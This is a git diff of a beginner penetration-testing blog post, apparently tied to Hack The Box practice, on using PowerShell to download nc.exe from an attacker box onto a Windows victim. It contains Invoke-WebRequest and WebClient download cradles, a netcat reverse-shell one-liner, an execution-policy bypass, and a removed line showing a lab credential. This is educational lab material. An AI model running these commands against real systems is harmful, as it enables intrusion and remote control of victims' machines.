@@ -7,8 +7,42 @@ description: PowerShell for Penetration Testing, and how to download files to a 
 tags: PowerShell python
 ---
 
-While completing Hack the Box's Sniper machine, I came across the need to have to switch to a different user. Credentials were discovered in a db.php file, and there was no way to login as that user using external tools such as Evil-WinRM. However, thanks to PowerShell, there is a simple way to quickly write a script to store these credentials in variables, and enter a new PowerShell session to that user. To begin, the credentials discovered were Chris:36mEAhz/B8xQ~2VM. To start out, the first variables I needed to set were the username and password:
+This next installment in the Powershell For Penetration Testers looks into how an attacker can introduce files to a victim machine through a PowerShell download, as well as how to use PowerShell to upload files rom a victim machine to your attacking box. I recently decided to continue on with this series to help other new comers into the field to learn as I learn. I recently used these skills on a recent Hack The Box machine, which if I remember to, will post the link to the writeup as a practical example.
+
+<h1>Downloading Files with PowerShell</h1>
+
+Using a PowerShell session, an attacker can quickly download files to a victim machine rather quickly. There are hundreds of examples mroe intense then what I will show you, but here are my two methods and go-to's which I attempt whenever I am performing an attack. In the examples to follow, I will assume that I am attempting to download `nc.exe` to the victim machine, which I would then plan to use to call a reverse shell back to my attacking machine. I will assume that the victim machine I am attacking is a Windows based Operating System, and I am using Kali Linux as my attacking box. Luckily, PowerShell is installed on all Windows platforms, including Windows IoT Core (hint for the Hack The Box machine).
+
+Please also assume that my Kali Linux has a HTTP server running (This can be Apache, Python's SimpleHTTPServer, whatever you prefer) and has an IP of 10.10.10.2, where the Windows machine is 10.10.10.1. 
+
+<h2>Invoke-WebRequest</h2>
+
+The first example is a quick one that can easily be remembered, using a PowerShell cmdlet:
 
 {% highlight bash linenos %}
-
+powershell -c "mkdir c:\temp & Invoke-WebRequest -URI http://10.10.10.2/nc.exe -OUTFILE c:\temp\nc.exe"
 {% endhighlight %}
+
+This command first calls PowerShell to run a command with the `-c` flag. This is shortened from the `-Command` flag. This also assumes that you are on the machine with a command prompt. Then, the command is actually executed, first making a directory to save our `nc.exe` binary to. The following command then uses the `Invoke-WebRequest` cmdlet to download our file from the web server, and saves it to the `C:\temp` directory.
+
+We could further this command by then calling `& c:\temp\nc.exe -e cmd.exe 10.10.10.1 1337` to connect back to our reverse shell (but that is outside of this article) to further our attack as a one-liner.
+
+<h2>System.Net.WebClient<h2>
+
+However, I frequently find that this is not the preferred method in Hack The Box or other CTF's to download files to victims. This brings us to our next approach, using PowerShell's `System.Net.WebClient`:
+
+{% highlight bash linenos %}
+powershell -c "mkdir c:\temp & (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.2/nc.exe','C:\temp\nc.exe')"
+{% endhighlight %}
+
+This is similar to the example above, creating the directory before downloading, only using a .NET class to download.
+
+<h2>Remember -ExecutionPolicy Bypasss</h2>
+
+Along with PowerShell, remembe that there are sometimes restrictions placed onto the PowerShell session you may be running. I already have an article describing how to beat these execution policies, found <a href="/2020/05/23/powershell-for-pentesters-beating-restricted-policies.html" target="_blank">here</a>. To make sure that you beat these restricted execution methods, quickly throw a `-exec bypass` before your download command:
+
+{% highlight bash linenos %}
+powershell -c "-exec bypass mkdir c:\temp & Invoke-WebRequest -URI http://10.10.10.2/nc.exe -OUTFILE c:\temp\nc.exe"
+{% endhighlight %}
+
+<h1>Efiltrating Data<h2>
